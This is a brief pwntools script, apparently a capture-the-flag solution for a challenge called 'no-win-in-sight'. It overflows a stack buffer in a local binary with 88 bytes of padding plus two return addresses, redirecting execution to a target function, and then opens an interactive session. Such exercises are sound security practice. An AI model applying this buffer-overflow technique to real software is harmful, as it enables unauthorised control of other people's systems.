from pwn import *
#p=remote("fitsec-no-win-in-sight.chals.io", 443, ssl=True, sni="fitsec-no-win-in-sight.chals.io")
p = process("./nowininsight.bin")
p.recvuntil(">>>")
chain = b"A"*88
chain += p64(0x040101a)
chain += p64(0x0401211)
p.sendline(chain)
p.interactive()
